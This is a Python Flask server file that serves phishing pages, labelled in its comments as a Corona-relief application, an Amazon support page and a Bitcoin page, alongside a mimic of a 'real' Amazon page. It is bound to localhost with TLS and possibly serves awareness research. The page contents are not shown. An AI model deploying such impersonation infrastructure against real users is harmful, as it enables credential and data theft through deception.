from flask import Flask, request, send_from_directory, send_file
from os import path

# set the project root directory as the static folder, you can set others.
app = Flask(__name__, static_url_path='')
app.config.from_pyfile('config.py', silent=True)
app._static_folder = ""

t_path = path.abspath(path.dirname(__file__))
html_folder_path = path.join(t_path, 'html')

# Corona phishing site

@app.route('/neuerAntrag')
def corona_ger():
    file_path = path.join(html_folder_path, 'ger/corona.html')
    return send_file(file_path)

@app.route('/register')
def corona_eng():
    file_path = path.join(html_folder_path, 'eng/corona.html')
    return send_file(file_path)


# "real" Amazon site

@app.route('/gp/r.html')
def real_amazon_eng():
    file_path = path.join(html_folder_path, 'eng/realamazon.html')
    return send_file(file_path)

@app.route('/images/I/51uXLXaz3BL.jpg')
def real_amazon_cup_image():
    file_path = path.join(html_folder_path, 'eng/amazoncup.jpg')
    return send_file(file_path)


# Amazon phishing site

@app.route('/support')
def amazon_eng():
    file_path = path.join(html_folder_path, 'eng/amazon.html')
    return send_file(file_path)


# Bitcoin phishing site (currently not included)

@app.route('/bitcoin')
def bitcoin():
    file_path = path.join(html_folder_path, 'bitcoin.html')
    return send_file(file_path)


@app.route('/bitcoin/bitcoin.png')
def bitcoin_image():
    file_path = path.join(html_folder_path, 'bitcoin.png')
    return send_file(file_path)



if __name__ == "__main__":
    app.run(host='127.0.0.1', port=443,
            ssl_context=(r'server.crt',
                         r'server.key'))
